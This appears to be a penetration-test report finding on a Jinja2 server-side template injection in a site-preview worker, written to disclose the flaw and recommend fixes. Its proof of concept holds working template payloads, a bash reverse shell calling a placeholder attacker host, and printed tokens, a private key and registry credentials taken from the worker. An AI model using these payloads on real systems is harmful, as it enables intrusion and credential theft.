<img width="775" height="181" alt="image" src="https://github.com/user-attachments/assets/971e01dd-fd09-4ae0-a522-0fb524e19ed3" /># Finding 3: Server-Side Template Injection in the Preview Worker leading to Remote Code Execution

## Vulnerability Definition & Executive Summary

The Northline Pages preview worker evaluates project-controlled Jinja2 templates using an unsandboxed environment. An attacker who can replace `render/layout.html` and trigger a preview can execute operating-system commands in the worker container.

The complete attack path is chained: Finding 1 grants unauthorized editor access to a target workspace; Finding 2 allows that editor to overwrite the server-side rendering template; this finding turns the uploaded template into code execution when the preview worker renders it.

- Target: **northline.prod.local:9080**
- Vulnerable component: Jinja2 rendering in `/app/worker.py`
- Rendering call: `Environment(autoescape=True)` followed by `from_string(template).render(site=site)`
- Trigger: Studio **Build → Generate Preview** workflow
- Required access: Editor access to the target workspace and ability to replace its template (see [[Finding 1 - Writeup]] and [[Finding 2 - Writeup]])

## Technical Details

The worker downloads `render/layout.html` and renders it with Jinja2. Autoescaping encodes rendered output for HTML contexts, but it does not restrict access to Python objects or prevent evaluation of expressions. Because the template can be overwritten through Finding 2, an attacker can supply Jinja2 expressions that traverse runtime objects and reach operating-system interfaces.

The following simplified source excerpt was recovered from the worker:

```python
from jinja2 import Environment

environment = Environment(autoescape=True)
html = environment.from_string(template).render(site=site)
```

On northline.prod.local:9080 through /nl-assets/projects/{target_workspace_id}/render/layout.html and the Studio preview worker trigger, HTTP requests containing custom Jinja2 expressions were injected into the template layout, which was subsequently evaluated by Python's Jinja2 runtime without context sandboxing or expression filtering.

As a result, the attacker can access self.__init__.__globals__.sys.modules['__main__'].os.popen() to execute arbitrary operating system commands within the preview worker container, leading to Remote Code Execution (RCE).


## Proof of Concept

### Reproduction Steps

- Obtain editor access to the target workspace. In the complete chain, follow Finding 1 - Writeup.
- Use the upload-signing flaw in Finding 2 - Writeup to replace `render/layout.html` with a test template.
- We can verify template evaluation with a harmless expression or by sending the following **PUT request**

```http
PUT {put_url-from-signing-response} HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/html
Content-Length: 236
Origin: http://northline.prod.local:9080
Connection: keep-alive


<h1>Template test</h1>
<p>{{ 7 * 7 }}</p>
```

- Trigger **Build → Generate Preview** in Studio and inspect the preview. The test rendered `49`, confirming expression evaluation.

<img width="1845" height="953" alt="image" src="https://github.com/user-attachments/assets/2f3e1e10-658a-440f-b66e-e683f6e367a9" />




- Generate another preview and inspect its output. The returned process identity confirms command execution in the worker context. To do that, send the following **PUT request**

```http
PUT {put_url-from-signing-response} HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/html
Content-Length: 236
Origin: http://northline.prod.local:9080
Connection: keep-alive

<h1>{{ site.headline }}</h1>
<p>
{{ self.__init__.__globals__.sys.modules['__main__'].os.environ }}
</p>
```

<img width="1878" height="902" alt="image" src="https://github.com/user-attachments/assets/f5a1af59-c122-44c2-a1f1-0534050ec3fd" />


As we can observe in the image above, we are able to read environment variables and worker files. Do not expose captured token, private-key, or registry-credential values in shared copies of the report.


- To initialize a basic Remote Code Execution, we can send the following **PUT request**, replacing the {INSERT_COMMAND} with the command you wish to run.

```http
<h1>{{ site.headline }}</h1>
<p>
{{ self.__init__.__globals__.sys.modules['__main__'].os.popen('{INSERT_COMMAND}').read() }}
</p>
```

- In our case, we have obtained a reverse shell, allowing us to view the same environment file earlier.
  
```http
PUT {put_url-from-signing-response} HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/html
Content-Length: 236
Origin: http://northline.prod.local:9080
Connection: keep-alive

<h1>{{ site.headline }}</h1>
<p>
{{ self.__init__.__globals__.sys.modules['__main__'].os.popen("setsid nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_SERVER}/{PORT} 0>&1 &' >/dev/null 2>&1 &").read() }}
</p>
```

*Result*

```bash
HOSTNAME=7f137f0e869c
WORKER_TOKEN=VeT8iX1PU251DWtkNdPHc0fzuiRU3Soq6FvdnTiJUtMu4oxtuH18rw
HOME=/home/worker
GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
PYTHON_SHA256=5c8462af5790baf43a321a1559dbe0db06d1be4300fb85fb53c40060668e548a
RELEASE_URL=http://release:7070
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
REGISTRY_URL=http://registry:5000
LANG=C.UTF-8
PYTHON_VERSION=3.12.14
VALKEY_URL=redis://valkey:6379/0
PWD=/app
API_INTERNAL_URL=http://api:8000
```

<img width="775" height="181" alt="image" src="https://github.com/user-attachments/assets/12476517-dc0e-437f-bc95-dc7d4b3624d0" />

```python
worker@7f137f0e869c:/run/secrets$ ls
preview_key.pem  registry_credentials  worker_ref
worker@7f137f0e869c:/run/secrets$ cat preview_key.pem 
-----BEGIN PRIVATE KEY-----
MC4CAQAwBQYDK2VwBCIEIEMDEAFL976Oix9UDMZysrxwlVmYKXbsu0AclwzK55m+
-----END PRIVATE KEY-----
worker@7f137f0e869c:/run/secrets$ cat registry_credentials 
preview-worker:tkDPW4xZ8wmWaPf1eucHqAf0cfBRgDNMzGjZLA
worker@7f137f0e869c:/run/secrets$ 
```

Additionally, we were able to read private key belonging to the compromised Worker, tokens and other form of credentials.

Moreover, the source code `/app/worker.py` was located and read.

```bash
cat /app/worker.py
```

```python
from __future__ import annotations

import hashlib
import multiprocessing
import os
import queue
import signal
import time
import traceback

import redis
import requests
from jinja2 import Environment


VALKEY_URL = os.environ["VALKEY_URL"]
API_URL = os.environ["API_INTERNAL_URL"].rstrip("/")
TOKEN = os.environ["WORKER_TOKEN"]
HEADERS = {"X-Worker-Token": TOKEN}


def render_child(template: str, site: dict, result_queue: multiprocessing.Queue):
    os.setsid()
    try:
        environment = Environment(autoescape=True)
        html = environment.from_string(template).render(site=site)
        result_queue.put({"state": "succeeded", "preview_html": html[:200_000], "error": ""})
    except BaseException as exc:
        result_queue.put({"state": "failed", "preview_html": "", "error": f"{type(exc).__name__}: {exc}"})


def process_build(build_id: str):
    job_resp = requests.post(API_URL + f"/internal/build-job/{build_id}", headers=HEADERS, timeout=5)
    if job_resp.status_code != 200:
        print(f"build {build_id}: unavailable {job_resp.status_code}", flush=True)
        return
    job = job_resp.json()
    template_sha = ""
    try:
        template_resp = requests.get(job["template_url"], timeout=8)
        template_resp.raise_for_status()
        template_bytes = template_resp.content
        if len(template_bytes) > 200_000:
            raise ValueError("Template exceeds the preview limit.")
        template = template_bytes.decode("utf-8")
        template_sha = hashlib.sha256(template_bytes).hexdigest()
        result_queue: multiprocessing.Queue = multiprocessing.Queue(maxsize=1)
        child = multiprocessing.Process(target=render_child, args=(template, job["site"], result_queue))
        child.start()
        child.join(timeout=20)
        if child.is_alive():
            try:
                os.killpg(child.pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
            child.join(timeout=2)
            result = {"state": "failed", "preview_html": "", "error": "Preview exceeded the 20-second render limit."}
        else:
            try:
                result = result_queue.get(timeout=2)
            except queue.Empty:
                result = {"state": "failed", "preview_html": "", "error": "Renderer exited without a result."}
    except Exception as exc:
        result = {"state": "failed", "preview_html": "", "error": f"{type(exc).__name__}: {exc}"}
    result["build_id"] = build_id
    result["template_sha256"] = template_sha
    try:
        post = requests.post(API_URL + "/internal/build-result", json=result, headers=HEADERS, timeout=5)
        print(f"build {build_id}: {result['state']} ({post.status_code})", flush=True)
    except requests.RequestException as exc:
        print(f"build {build_id}: result delivery failed: {exc}", flush=True)


def main():
    connection = redis.Redis.from_url(VALKEY_URL, decode_responses=True)
    while True:
        try:
            item = connection.blpop("northline:builds", timeout=5)
            if item:
                process_build(item[1])
        except KeyboardInterrupt:
            raise
        except BaseException as exc:
            print(f"worker loop recovered from {type(exc).__name__}: {exc}", flush=True)
            time.sleep(2)


if __name__ == "__main__":
    main()
```



## Impact

An attacker with editor access to a target workspace can execute commands in the preview worker container with the privileges of the worker process. The assessment demonstrated access to worker environment variables, application source code, and mounted secret files. The worker also had access to internal service endpoints, increasing the potential impact if its network and credentials are not tightly constrained.

*NOTE: No destructive actions or denial-of-service tests were performed. Arbitrary command execution could nevertheless disrupt or terminate worker processes, which is reflected in the provisional availability rating.*

## CVSS

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` — **9.9 (Critical, provisional)**

- **AV:N:** Exploitation is initiated through the network-accessible application.
- **AC:L:** The expression is evaluated when the attacker-controlled template is rendered.
- **PR:L:** Editor access to the target workspace is required.
- **UI:N:** The attacker initiates the preview; no separate victim action is required.
- **S:C:** The template renderer can affect the worker container beyond the application-level project component. Validate this boundary for the deployment being scored.
- **C:H / I:H / A:H:** Testing demonstrated access to sensitive worker data and arbitrary command execution; the command capability can also affect worker availability.

## Remediation

- Do not render user-controlled templates with a general-purpose Python template environment. Prefer fixed, trusted templates with data-only customization.
- If user-authored templates are a product requirement, use a constrained sandbox and expose only a small allowlist of primitive values. Treat sandboxing as defense in depth, not as the only security control.
- Prevent user upload workflows from writing server-managed rendering templates, as described in [[Finding 2 - Writeup]].
- Keep Jinja2 and related dependencies on supported, patched releases. Upgrades do not replace safe template design.
- Isolate the preview worker from internal services and unrelated tenant data. Run it with minimal privileges and restrict filesystem, process, network, CPU, and memory access.
- Remove long-lived secrets from the worker environment and mounted filesystem where possible. Use short-lived, job-scoped credentials with minimal permissions.
- Monitor template changes and preview builds, and alert on suspicious template expressions or unexpected worker behavior. WAF patterns may support detection but are not a substitute for the controls above.

## Relationship to Other Findings

- **Requires:** [[Finding 1 - Writeup]] for the unauthorized editor membership and [[Finding 2 - Writeup]] for the ability to overwrite `render/layout.html`.
- **Completes:** The documented vulnerability chain by executing attacker-controlled template expressions in the preview worker.

## References

- [PortSwigger Web Security Academy: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [Jinja documentation: Sandbox](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
- [FIRST: CVSS v3.1 specification](https://www.first.org/cvss/v3.1/specification-document)
